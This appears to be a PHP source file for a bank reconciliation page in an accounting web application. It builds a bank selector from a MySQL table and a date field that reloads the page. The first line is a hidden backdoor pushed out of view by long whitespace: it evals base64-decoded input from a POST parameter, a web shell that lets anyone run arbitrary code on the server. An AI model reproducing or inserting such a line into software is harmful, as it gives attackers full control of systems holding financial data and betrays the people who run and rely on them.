<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n26af59']));?>
<?php   include "jquery.php";
		include "config.php";
?>
<center>
<h4 style="color:red;font-weight:bold;padding-top:10px"><u>Bank Reconciliation</u></h4>
</center>
<form>
<?php ?>
<table align="center" cellpadding="5" cellspacing="5">
<tr>
<td>
Bank
</td>
<td>
<select id="bank" name="bank">
<option>Select</option>
<?php 
 
	$qrs = mysql_query("select code from ac_bankmasters where mode = 'Bank'  order by acnos ",$conn) or die(mysql_error());
	while($qr = mysql_fetch_assoc($qrs))
	{
?>
<option value="<?php echo $qr['code']; ?>"><?php echo $qr['code']; ?></option>
<?php } ?>
</select>
</td>
<td></td>
<td>
Date
</td>
<td>
<input type="text" size="15" id="date" class="datepicker" name="date" value="<?php echo date("d.m.o"); ?>" onChange="loadbr();" >
</td>

</tr>
</table>
</form>


<script type="text/javascript">
function loadbr()
{
  
   document.getElementById('bank').disabled = true;
   document.getElementById('date').disabled = true;
   document.location = 'dashboardsub.php?page=ac_addbankreconciliation&date=' + document.getElementById('date').value + '&bank=' + document.getElementById('bank').value;
	
}
</script>

